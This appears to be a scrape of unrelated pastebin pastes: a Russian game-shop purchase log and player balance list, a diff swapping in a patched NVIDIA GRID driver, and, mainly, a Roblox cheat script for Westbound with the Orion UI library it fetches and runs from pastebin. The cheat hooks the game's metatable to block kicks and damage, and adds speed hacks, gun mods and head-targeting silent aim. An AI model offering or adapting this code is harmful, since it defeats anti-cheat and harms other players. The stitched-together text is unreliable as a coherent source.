SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
thenewmaks122 ПОПОЛНИЛ НА: 863.99 эмов
thenewmaks122 ПОПОЛНИЛ НА: 387.2 эмов
thenewmaks122 ПОПОЛНИЛ НА: 172.8 эмов
thenewmaks122 ПОПОЛНИЛ НА: 288 эмов
thenewmaks122 КУПИЛ НА: 2775 эм,предмет:Поножи Виверны               , штук:1
thenewmaks122 ПОПОЛНИЛ НА: 466.49 эмов
thenewmaks122 ПОПОЛНИЛ НА: 188.79 эмов
thenewmaks122 ПОПОЛНИЛ НА: 57.59 эмов
thenewmaks122 ПОПОЛНИЛ НА: 51.83 эмов
thenewmaks122 КУПИЛ НА: 870 эм,предмет:Флаксовый конденсатор Виверны, штук:1
SamSalvatrucha ПОПОЛНИЛ НА: 2700 эмов
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
SamSalvatrucha КУПИЛ НА: 300 эм,предмет:Алмаз             , штук:1000
bogatyr4ik КУПИЛ НА: 0.75 эм,предмет:Око Эндера        , штук:1
bogatyr4ik КУПИЛ НА: 33 эм,предмет:Очки ночного видения                              , штук:1
AnkoMira КУПИЛ НА: 135 эм,предмет:Порт доступа к реактору       , штук:2
pellixuser ПОПОЛНИЛ НА: 127.99 эмов
pellixuser КУПИЛ НА: 24 эм,предмет:Генератор <Ледяной> материи           , штук:1
pellixuser КУПИЛ НА: 24 эм,предмет:Генератор <Темной> материи            , штук:1
pellixuser КУПИЛ НА: 24 эм,предмет:Генератор <Живой> материи             , штук:1
pellixuser КУПИЛ НА: 24 эм,предмет:Генератор <Огненной> материи          , штук:1
Namelies ПОПОЛНИЛ НА: 160 эмов
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 0.3 эм,предмет:Книга             , штук:1
AnkoMira КУПИЛ НА: 101 эм,предмет:Тростник          , штук:101
AnkoMira ПОПОЛНИЛ НА: 28.79 эмов
BedMen ПОПОЛНИЛ НА: 10 эмов
"
1M4M2Ptf,gn,Ling_Mao,Lua,Saturday 8th of July 2023 02:26:45 AM CDT,"local OrionLib = loadstring(game:HttpGet(('https://pastebin.com/raw/P7pmtkET')))()

local Window = OrionLib:MakeWindow({Name = ""黑猫脚本"", HidePremium = false, SaveConfig = true, ConfigFolder = ""OrionTest""})


local Tab = Window:MakeTab({
	Name = ""🧊主页🧊"",
	Icon = ""rbxassetid://10039322658"",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = ""🔱 黑 猫 脚 本 🔱""
})

local Section = Tab:AddSection({
	Name = ""🔱 黑 猫 Q Q 群 881072957 🔱""
})

local Section = Tab:AddSection({
	Name = ""🟢 永 久 免 费 , 不 收 一 分 钱 🟢""
})




local Section = Tab:AddSection({
	Name = "" 💎 因 为 刚 开 始 做 , 所 以 没 多 少 功 能 , 请 谅 , 解 后 续 我 会 更 新 功 能 💎 ""
})
local Section = Tab:AddSection({
	Name = ""😉 希 望 您 使 用 愉 快 ！😉""
})




local Tab = Window:MakeTab({
	Name = ""一路向西"",
	Icon = ""rbxassetid://10039322658"",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = ""💎 中文名:一路向西 🔰 英文名:Westbound 💎 ""
})--一路向西


local Section = Tab:AddSection({
	Name = ""————————————————————————————————————————————————""
})

local Section = Tab:AddSection({
	Name = ""一路向西四年老玩家的建议""
})

local Section = Tab:AddSection({
	Name = ""如果你是开变态的功能""
})


local Section = Tab:AddSection({
	Name = ""尽量不要和外国人起冲突 大多数外国人都会进游戏官方群""
})

local Section = Tab:AddSection({
	Name = ""如果是小号 上面的话 就当屁话 :/""
})

local Section = Tab:AddSection({
	Name = ""————————————————————————————————————————————————""
})

local Section = Tab:AddSection({
	Name = "" 🎫 人 物 功 能 🎫 ""
})--人物菜单

Tab:AddButton({
	Name = ""无限跳跃"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""无限跳跃已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})
local InfiniteJumpEnabled = true
game:GetService(""UserInputService"").JumpRequest:connect(function()
if InfiniteJumpEnabled then
game:GetService""Players"".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState(""Jumping"")
end
end)
  	end    
})--无限跳

Tab:AddButton({
	Name = ""防摔(配合无限跳)"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""防摔已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})
local gamemt = getrawmetatable(game)
local oldNc = gamemt.__namecall
setreadonly(gamemt, false)

gamemt.__namecall = newcclosure(function(self, ...)
  if (getnamecallmethod() == 'FireServer' and self.Name == 'ChangeCharacter') then
    local args = {...}
    if (args[1] and args[1] == 'Damage') then
      return nil
    end
  end 
   return oldNc(self, ...)
end)
  	end    
})--防摔

Tab:AddButton({
	Name = ""快速拾取 (死亡后需要重开)"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""快速拾取已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})
local v15 = require(game:GetService(""Workspace"")[game.Players.LocalPlayer.Name].ContextActions.ContextMain);
v15:New({
RobPlayerLength = 0.1, 
FixWallLength = 0.1, 
CrackSafeLength = 0.1, 
RobSafeLength = 0.1, 
RobRegisterLength = 0.1, 
PickCellLength = 0.1, 
SkinAnimalLength = 0.1
}, 200, { ""Get out of my shop! Outlaws are not welcome here!"", ""Hey, scoundrel! Get out before I call the sheriff!"", ""You're an outlaw! We don't serve your type here!"" }, { ""This here's a bandit camp! Get out!"", ""Get lost, cowboy!"", ""Are you an outlaw? Didn't think so! Scram!"" });
  	end    
})--快速拾取


Tab:AddButton({
	Name = ""速度 30 死亡后需要重开"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""30倍已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})

local gamemt = getrawmetatable(game)
local oldNc = gamemt.__namecall
setreadonly(gamemt, false)

gamemt.__namecall = newcclosure(function(...)
  if (getnamecallmethod() == 'Kick') then return nil end
  return oldNc(...)
end)

local lp = game:GetService('Players').LocalPlayer
local hum = lp.Character.Humanoid

local function changeStats()
  hum.WalkSpeed = 30
end

changeStats()

hum:GetPropertyChangedSignal('WalkSpeed'):Connect(changeStats)
  	end    
})--30

Tab:AddButton({
	Name = ""速度 50 死亡后需要重开"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""50倍已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})

local gamemt = getrawmetatable(game)
local oldNc = gamemt.__namecall
setreadonly(gamemt, false)

gamemt.__namecall = newcclosure(function(...)
  if (getnamecallmethod() == 'Kick') then return nil end
  return oldNc(...)
end)

local lp = game:GetService('Players').LocalPlayer
local hum = lp.Character.Humanoid

local function changeStats()
  hum.WalkSpeed = 50
end

changeStats()

hum:GetPropertyChangedSignal('WalkSpeed'):Connect(changeStats)
  	end    
})--50

Tab:AddButton({
	Name = ""速度100 死亡后需要重开"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""100倍已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})

local gamemt = getrawmetatable(game)
local oldNc = gamemt.__namecall
setreadonly(gamemt, false)

gamemt.__namecall = newcclosure(function(...)
  if (getnamecallmethod() == 'Kick') then return nil end
  return oldNc(...)
end)

local lp = game:GetService('Players').LocalPlayer
local hum = lp.Character.Humanoid

local function changeStats()
  hum.WalkSpeed = 100
end

changeStats()

hum:GetPropertyChangedSignal('WalkSpeed'):Connect(changeStats)
  	end    
})--100


local Section = Tab:AddSection({
	Name = "" 🪓 武 器 功 能 🪓 ""
})--武器功能

Tab:AddButton({
	Name = ""超级枪械 (无后坐力)"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""超级枪已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})

    local mods = {
    Damage = 100, 
    FanFire = true, 
    camShakeResist = 0, 
    Spread = 0, 
    prepTime = 0, 
    equipTime = 0, 
    MaxShots = math.huge, 
    ReloadAnimationSpeed = 0, 
    ReloadSpeed = 0, 
    HipFireAccuracy = 0, 
    ZoomAccuracy = 0, 
    InstantFireAnimation = true
}

for _, gun in pairs(require(game:GetService(""ReplicatedStorage"").GunScripts.GunStats)) do
    for prop, value in pairs(mods) do
        if gun[prop] then
            gun[prop] = value
        end
    end
end
  	end 
})

Tab:AddButton({
	Name = ""魔法子弹(范围,有朋友在服务器的话,不建议开它)"",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = ""黑猫助手"",
	Content = ""魔法子弹已开启"",
	Image = ""rbxassetid://9493689752"",
	Time = 3
})

local Camera = game:GetService(""Workspace"").CurrentCamera
local Players = game:GetService(""Players"")
local LocalPlayer = game:GetService(""Players"").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, ""HumanoidRootPart"") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local GameMetaTable = getrawmetatable(game)
local OldGameMetaTableNamecall = GameMetaTable.__namecall
setreadonly(GameMetaTable, false)

GameMetaTable.__namecall = newcclosure(function(object, ...)
   local NamecallMethod = getnamecallmethod()
   local Arguments = {...}

   if tostring(NamecallMethod) == ""FindPartOnRayWithIgnoreList"" then
       local ClosestPlayer = GetClosestPlayer()
       
       if ClosestPlayer and ClosestPlayer.Character then
           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
       end
   end

   return OldGameMetaTableNamecall(object, unpack(Arguments))
end)

setreadonly(GameMetaTable, true)
  	end    
})

"
2ZiNuY9h,userbalances.lua (за 06-08 июля),mrWhiskasss,Lua,Saturday 8th of July 2023 02:23:13 AM CDT,"{   ""mrWhiskasss"",   8442.44,},
{   ""Steve"",   0,},
{   ""thenewmaks122"",   16.81,},
{   ""SamSalvatrucha"",   16.81,},
{   ""Pasasisya"",   0.48,},
{   ""Dima0299"",   76.74,},
{   ""norus2010"",   0,},
{   ""anaki97"",   0,},
{   ""mbfuji01"",   129,},
{   ""Moxit47"",   0,},
{   ""vkhomiak"",   0,},
{   ""WermonWR"",   0,},
{   ""max32"",   2.48,},
{   ""AnkoMira"",   31.56,},
{   ""chapi89"",   9.8,},
{   ""DasDass"",   0,},
{   ""Bmaw"",   0,},
{   ""ExynosOcta"",   0,},
{   ""STORMYpro"",   12.45,},
{   ""nubsided"",   207.14,},
{   ""Alpaka_Masha"",   14.75,},
{   ""meng_end"",   0.25,},
{   ""Ivasikk"",   5,},
{   ""GuraD1t"",   0,},
{   ""KIEV_Alexandr"",   0,},
{   ""bogatyr4ik"",   426.25,},
{   ""pellixuser"",   31.97,},
{   ""Enix_1"",   0,},
{   ""ArtemKILL"",   5.3,},
{   ""BedMen"",   10,},
{   ""ProggRPG22"",   6.46,},
{   ""keroroblox"",   0,},
{   ""__HAPKOMAH__"",   0.71,},
{   ""Kazra"",   0,},
{   ""nvazd"",   0,},
{   ""ZoveForever"",   0,},
{   ""bukashka_"",   0,},
{   ""HINMAS"",   20,},
{   ""_JIoTTaTa_"",   68.36,},
{   ""Namelies"",   160,},
{   ""Rodeus"",   0,},
"
7UdwJ6c2,525.105.17-grid-patched.diff,abraha2d,Diff,Saturday 8th of July 2023 02:20:36 AM CDT,"diff --git a/data/nvidia-525.105.17-x86_64.data b/data/nvidia-525.105.17-x86_64.data
index df01be6..9730af8 100644
--- a/data/nvidia-525.105.17-x86_64.data
+++ b/data/nvidia-525.105.17-x86_64.data
@@ -1 +1 @@
-:c635a21a282c9b53485f19ebb64a0f4b536a968b94d4d97629e0bc547a58142a:414594622::https://us.download.nvidia.com/XFree86/Linux-x86_64/525.105.17/NVIDIA-Linux-x86_64-525.105.17.run
+:5f44ec68ec7d2816fc6202895a95b88348103b92c2d66fe92e95880d79ed0916:550158585::http://localhost/NVIDIA-Linux-x86_64-525.105.17-grid-patched.run
diff --git a/versions.sh b/versions.sh
index 1d57d49..f53b082 100755
--- a/versions.sh
+++ b/versions.sh
@@ -15,4 +15,5 @@ TESLA_VERSIONS=""525.85.12 525.60.13 520.61.05 515.105.01 515.65.07 510.73.08 470
 # Probably never: https://ahayzen.com/direct/flathub_downloads_only_nvidia_runtimes.txt
 UNSUPPORTED_VERSIONS=""390.157 390.154 390.151 390.147 390.144 390.143 390.141 390.138 390.132 390.129 390.116 390.87 390.77 390.67 390.59 390.48 390.42 390.25 390.12 387.34 387.22 387.12 384.130 384.111 384.98 384.90 384.69 384.59 384.47 381.22 381.09 378.13 375.82 375.66 375.39 375.26 370.28 367.57""
 
-DRIVER_VERSIONS=""$BETA_VERSIONS $VULKAN_VERSIONS $NEW_FEATURE_VERSIONS $PRODUCTION_VERSIONS $LEGACY_VERSIONS $TESLA_VERSIONS $UNSUPPORTED_VERSIONS""
+#DRIVER_VERSIONS=""$BETA_VERSIONS $VULKAN_VERSIONS $NEW_FEATURE_VERSIONS $PRODUCTION_VERSIONS $LEGACY_VERSIONS $TESLA_VERSIONS $UNSUPPORTED_VERSIONS""
+DRIVER_VERSIONS=""525.105.17"""
P7pmtkET,HHHHHHHHHH,Ling_Mao,Lua,Saturday 8th of July 2023 02:14:41 AM CDT,"local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local RunService = game:GetService(""RunService"")
local LocalPlayer = game:GetService(""Players"").LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local HttpService = game:GetService(""HttpService"")

local OrionLib = {
	Elements = {},
	ThemeObjects = {},
	Connections = {},
	Flags = {},
	Themes = {
		Default = {
			Main = Color3.fromRGB(0,0,0),
			Second = Color3.fromRGB(0,0,0),
			Stroke = Color3.fromRGB(255,255,255),
			Divider = Color3.fromRGB(105,105,105),
			Text = Color3.fromRGB(248,248,255),
			TextDark = Color3.fromRGB(248,248,255)
		}
	},
	SelectedTheme = ""Default"",
	Folder = nil,
	SaveCfg = false
}

--Feather Icons https://github.com/evoincorp/lucideblox/tree/master/src/modules/util - Created by 7kayoh
local Icons = {}

local Success, Response = pcall(function()
	Icons = HttpService:JSONDecode(game:HttpGetAsync(""https://raw.githubusercontent.com/evoincorp/lucideblox/master/src/modules/util/icons.json"")).icons
end)

if not Success then
	warn(""\nOrion Library - Failed to load Feather Icons. Error code: "" .. Response .. ""\n"")
end	

local function GetIcon(IconName)
	if Icons[IconName] ~= nil then
		return Icons[IconName]
	else
		return nil
	end
end   

local Orion = Instance.new(""ScreenGui"")
Orion.Name = ""Orion""
if syn then
	syn.protect_gui(Orion)
	Orion.Parent = game.CoreGui
else
	Orion.Parent = gethui() or game.CoreGui
end

if gethui then
	for _, Interface in ipairs(gethui():GetChildren()) do
		if Interface.Name == Orion.Name and Interface ~= Orion then
			Interface:Destroy()
		end
	end
else
	for _, Interface in ipairs(game.CoreGui:GetChildren()) do
		if Interface.Name == Orion.Name and Interface ~= Orion then
			Interface:Destroy()
		end
	end
end

function OrionLib:IsRunning()
	if gethui then
		return Orion.Parent == gethui()
	else
		return Orion.Parent == game:GetService(""CoreGui"")
	end

end

local function AddConnection(Signal, Function)
	if (not OrionLib:IsRunning()) then
		return
	end
	local SignalConnect = Signal:Connect(Function)
	table.insert(OrionLib.Connections, SignalConnect)
	return SignalConnect
end

task.spawn(function()
	while (OrionLib:IsRunning()) do
		wait()
	end

	for _, Connection in next, OrionLib.Connections do
		Connection:Disconnect()
	end
end)

local function MakeDraggable(DragPoint, Main)
	pcall(function()
		local Dragging, DragInput, MousePos, FramePos = false
		AddConnection(DragPoint.InputBegan, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 then
				Dragging = true
				MousePos = Input.Position
				FramePos = Main.Position

				Input.Changed:Connect(function()
					if Input.UserInputState == Enum.UserInputState.End then
						Dragging = false
					end
				end)
			end
		end)
		AddConnection(DragPoint.InputChanged, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseMovement then
				DragInput = Input
			end
		end)
		AddConnection(UserInputService.InputChanged, function(Input)
			if Input == DragInput and Dragging then
				local Delta = Input.Position - MousePos
				--TweenService:Create(Main, TweenInfo.new(0.05, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Position  = UDim2.new(FramePos.X.Scale,FramePos.X.Offset + Delta.X, FramePos.Y.Scale, FramePos.Y.Offset + Delta.Y)}):Play()
				Main.Position  = UDim2.new(FramePos.X.Scale,FramePos.X.Offset + Delta.X, FramePos.Y.Scale, FramePos.Y.Offset + Delta.Y)
			end
		end)
	end)
end    

local function Create(Name, Properties, Children)
	local Object = Instance.new(Name)
	for i, v in next, Properties or {} do
		Object[i] = v
	end
	for i, v in next, Children or {} do
		v.Parent = Object
	end
	return Object
end

local function CreateElement(ElementName, ElementFunction)
	OrionLib.Elements[ElementName] = function(...)
		return ElementFunction(...)
	end
end

local function MakeElement(ElementName, ...)
	local NewElement = OrionLib.Elements[ElementName](...)
	return NewElement
end

local function SetProps(Element, Props)
	table.foreach(Props, function(Property, Value)
		Element[Property] = Value
	end)
	return Element
end

local function SetChildren(Element, Children)
	table.foreach(Children, function(_, Child)
		Child.Parent = Element
	end)
	return Element
end

local function Round(Number, Factor)
	local Result = math.floor(Number/Factor + (math.sign(Number) * 0.5)) * Factor
	if Result < 0 then Result = Result + Factor end
	return Result
end

local function ReturnProperty(Object)
	if Object:IsA(""Frame"") or Object:IsA(""TextButton"") then
		return ""BackgroundColor3""
	end 
	if Object:IsA(""ScrollingFrame"") then
		return ""ScrollBarImageColor3""
	end 
	if Object:IsA(""UIStroke"") then
		return ""Color""
	end 
	if Object:IsA(""TextLabel"") or Object:IsA(""TextBox"") then
		return ""TextColor3""
	end   
	if Object:IsA(""ImageLabel"") or Object:IsA(""ImageButton"") then
		return ""ImageColor3""
	end   
end

local function AddThemeObject(Object, Type)
	if not OrionLib.ThemeObjects[Type] then
		OrionLib.ThemeObjects[Type] = {}
	end    
	table.insert(OrionLib.ThemeObjects[Type], Object)
	Object[ReturnProperty(Object)] = OrionLib.Themes[OrionLib.SelectedTheme][Type]
	return Object
end    

local function SetTheme()
	for Name, Type in pairs(OrionLib.ThemeObjects) do
		for _, Object in pairs(Type) do
			Object[ReturnProperty(Object)] = OrionLib.Themes[OrionLib.SelectedTheme][Name]
		end    
	end    
end

local function PackColor(Color)
	return {R = Color.R * 255, G = Color.G * 255, B = Color.B * 255}
end    

local function UnpackColor(Color)
	return Color3.fromRGB(Color.R, Color.G, Color.B)
end

local function LoadCfg(Config)
	local Data = HttpService:JSONDecode(Config)
	table.foreach(Data, function(a,b)
		if OrionLib.Flags[a] then
			spawn(function() 
				if OrionLib.Flags[a].Type == ""Colorpicker"" then
					OrionLib.Flags[a]:Set(UnpackColor(b))
				else
					OrionLib.Flags[a]:Set(b)
				end    
			end)
		else
			warn(""Orion Library Config Loader - Could not find "", a ,b)
		end
	end)
end

local function SaveCfg(Name)
	local Data = {}
	for i,v in pairs(OrionLib.Flags) do
		if v.Save then
			if v.Type == ""Colorpicker"" then
				Data[i] = PackColor(v.Value)
			else
				Data[i] = v.Value
			end
		end	
	end
	writefile(OrionLib.Folder .. ""/"" .. Name .. "".txt"", tostring(HttpService:JSONEncode(Data)))
end

local WhitelistedMouse = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2,Enum.UserInputType.MouseButton3}
local BlacklistedKeys = {Enum.KeyCode.Unknown,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Up,Enum.KeyCode.Left,Enum.KeyCode.Down,Enum.KeyCode.Right,Enum.KeyCode.Slash,Enum.KeyCode.Tab,Enum.KeyCode.Backspace,Enum.KeyCode.Escape}

local function CheckKey(Table, Key)
	for _, v in next, Table do
		if v == Key then
			return true
		end
	end
end

CreateElement(""Corner"", function(Scale, Offset)
	local Corner = Create(""UICorner"", {
		CornerRadius = UDim.new(Scale or 0, Offset or 10)
	})
	return Corner
end)

CreateElement(""Stroke"", function(Color, Thickness)
	local Stroke = Create(""UIStroke"", {
		Color = Color or Color3.fromRGB(255, 255, 255),
		Thickness = Thickness or 1
	})
	return Stroke
end)

CreateElement(""List"", function(Scale, Offset)
	local List = Create(""UIListLayout"", {
		SortOrder = Enum.SortOrder.LayoutOrder,
		Padding = UDim.new(Scale or 0, Offset or 0)
	})
	return List
end)

CreateElement(""Padding"", function(Bottom, Left, Right, Top)
	local Padding = Create(""UIPadding"", {
		PaddingBottom = UDim.new(0, Bottom or 4),
		PaddingLeft = UDim.new(0, Left or 4),
		PaddingRight = UDim.new(0, Right or 4),
		PaddingTop = UDim.new(0, Top or 4)
	})
	return Padding
end)

CreateElement(""TFrame"", function()
	local TFrame = Create(""Frame"", {
		BackgroundTransparency = 1
	})
	return TFrame
end)

CreateElement(""Frame"", function(Color)
	local Frame = Create(""Frame"", {
		BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
		BorderSizePixel = 0
	})
	return Frame
end)

CreateElement(""RoundFrame"", function(Color, Scale, Offset)
	local Frame = Create(""Frame"", {
		BackgroundColor3 = Color or Color3.fromRGB(255, 255, 255),
		BorderSizePixel = 0
	}, {
		Create(""UICorner"", {
			CornerRadius = UDim.new(Scale, Offset)
		})
	})
	return Frame
end)

CreateElement(""Button"", function()
	local Button = Create(""TextButton"", {
		Text = """",
		AutoButtonColor = false,
		BackgroundTransparency = 1,
		BorderSizePixel = 0
	})
	return Button
end)

CreateElement(""ScrollFrame"", function(Color, Width)
	local ScrollFrame = Create(""ScrollingFrame"", {
		BackgroundTransparency = 1,
		MidImage = ""rbxassetid://7445543667"",
		BottomImage = ""rbxassetid://7445543667"",
		TopImage = ""rbxassetid://7445543667"",
		ScrollBarImageColor3 = Color,
		BorderSizePixel = 0,
		ScrollBarThickness = Width,
		CanvasSize = UDim2.new(0, 0, 0, 0)
	})
	return ScrollFrame
end)

CreateElement(""Image"", function(ImageID)
	local ImageNew = Create(""ImageLabel"", {
		Image = ImageID,
		BackgroundTransparency = 1
	})

	if GetIcon(ImageID) ~= nil then
		ImageNew.Image = GetIcon(ImageID)
	end	

	return ImageNew
end)

CreateElement(""ImageButton"", function(ImageID)
	local Image = Create(""ImageButton"", {
		Image = ImageID,
		BackgroundTransparency = 1
	})
	return Image
end)

CreateElement(""Label"", function(Text, TextSize, Transparency)
	local Label = Create(""TextLabel"", {
		Text = Text or """",
		TextColor3 = Color3.fromRGB(240, 240, 240),
		TextTransparency = Transparency or 0,
		TextSize = TextSize or 15,
		Font = Enum.Font.Gotham,
		RichText = true,
		BackgroundTransparency = 1,
		TextXAlignment = Enum.TextXAlignment.Left
	})
	return Label
end)

local NotificationHolder = SetProps(SetChildren(MakeElement(""TFrame""), {
	SetProps(MakeElement(""List""), {
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		SortOrder = Enum.SortOrder.LayoutOrder,
		VerticalAlignment = Enum.VerticalAlignment.Bottom,
		Padding = UDim.new(0, 5)
	})
}), {
	Position = UDim2.new(1, -25, 1, -25),
	Size = UDim2.new(0, 300, 1, -25),
	AnchorPoint = Vector2.new(1, 1),
	Parent = Orion
})

function OrionLib:MakeNotification(NotificationConfig)
	spawn(function()
		NotificationConfig.Name = NotificationConfig.Name or ""Notification""
		NotificationConfig.Content = NotificationConfig.Content or ""Test""
		NotificationConfig.Image = NotificationConfig.Image or ""rbxassetid://4384403532""
		NotificationConfig.Time = NotificationConfig.Time or 15

		local NotificationParent = SetProps(MakeElement(""TFrame""), {
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			Parent = NotificationHolder
		})

		local NotificationFrame = SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(25, 25, 25), 0, 10), {
			Parent = NotificationParent, 
			Size = UDim2.new(1, 0, 0, 0),
			Position = UDim2.new(1, -55, 0, 0),
			BackgroundTransparency = 0,
			AutomaticSize = Enum.AutomaticSize.Y
		}), {
			MakeElement(""Stroke"", Color3.fromRGB(93, 93, 93), 1.2),
			MakeElement(""Padding"", 12, 12, 12, 12),
			SetProps(MakeElement(""Image"", NotificationConfig.Image), {
				Size = UDim2.new(0, 20, 0, 20),
				ImageColor3 = Color3.fromRGB(240, 240, 240),
				Name = ""Icon""
			}),
			SetProps(MakeElement(""Label"", NotificationConfig.Name, 15), {
				Size = UDim2.new(1, -30, 0, 20),
				Position = UDim2.new(0, 30, 0, 0),
				Font = Enum.Font.GothamBold,
				Name = ""Title""
			}),
			SetProps(MakeElement(""Label"", NotificationConfig.Content, 14), {
				Size = UDim2.new(1, 0, 0, 0),
				Position = UDim2.new(0, 0, 0, 25),
				Font = Enum.Font.GothamSemibold,
				Name = ""Content"",
				AutomaticSize = Enum.AutomaticSize.Y,
				TextColor3 = Color3.fromRGB(200, 200, 200),
				TextWrapped = true
			})
		})

		TweenService:Create(NotificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 0, 0, 0)}):Play()

		wait(NotificationConfig.Time - 0.88)
		TweenService:Create(NotificationFrame.Icon, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
		TweenService:Create(NotificationFrame, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.6}):Play()
		wait(0.3)
		TweenService:Create(NotificationFrame.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0.9}):Play()
		TweenService:Create(NotificationFrame.Title, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.4}):Play()
		TweenService:Create(NotificationFrame.Content, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.5}):Play()
		wait(0.05)

		NotificationFrame:TweenPosition(UDim2.new(1, 20, 0, 0),'In','Quint',0.8,true)
		wait(1.35)
		NotificationFrame:Destroy()
	end)
end    

function OrionLib:Init()
	if OrionLib.SaveCfg then	
		pcall(function()
			if isfile(OrionLib.Folder .. ""/"" .. game.GameId .. "".txt"") then
				LoadCfg(readfile(OrionLib.Folder .. ""/"" .. game.GameId .. "".txt""))
				OrionLib:MakeNotification({
					Name = ""Configuration"",
					Content = ""Auto-loaded configuration for the game "" .. game.GameId .. ""."",
					Time = 5
				})
			end
		end)		
	end	
end	

function OrionLib:MakeWindow(WindowConfig)
	local FirstTab = true
	local Minimized = false
	local Loaded = false
	local UIHidden = false

	WindowConfig = WindowConfig or {}
	WindowConfig.Name = WindowConfig.Name or ""Orion Library""
	WindowConfig.ConfigFolder = WindowConfig.ConfigFolder or WindowConfig.Name
	WindowConfig.SaveConfig = WindowConfig.SaveConfig or false
	WindowConfig.HidePremium = WindowConfig.HidePremium or false
	if WindowConfig.IntroEnabled == nil then
		WindowConfig.IntroEnabled = true
	end
	WindowConfig.IntroText = WindowConfig.IntroText or ""黑猫Hub""
	WindowConfig.CloseCallback = WindowConfig.CloseCallback or function() end
	WindowConfig.ShowIcon = WindowConfig.ShowIcon or false
	WindowConfig.Icon = WindowConfig.Icon or ""rbxassetid://9493689752""
	WindowConfig.IntroIcon = WindowConfig.IntroIcon or ""rbxassetid://9493689752""
	OrionLib.Folder = WindowConfig.ConfigFolder
	OrionLib.SaveCfg = WindowConfig.SaveConfig

	if WindowConfig.SaveConfig then
		if not isfolder(WindowConfig.ConfigFolder) then
			makefolder(WindowConfig.ConfigFolder)
		end	
	end

	local TabHolder = AddThemeObject(SetChildren(SetProps(MakeElement(""ScrollFrame"", Color3.fromRGB(255, 255, 255), 4), {
		Size = UDim2.new(1, 0, 1, -50)
	}), {
		MakeElement(""List""),
		MakeElement(""Padding"", 8, 0, 0, 8)
	}), ""Divider"")

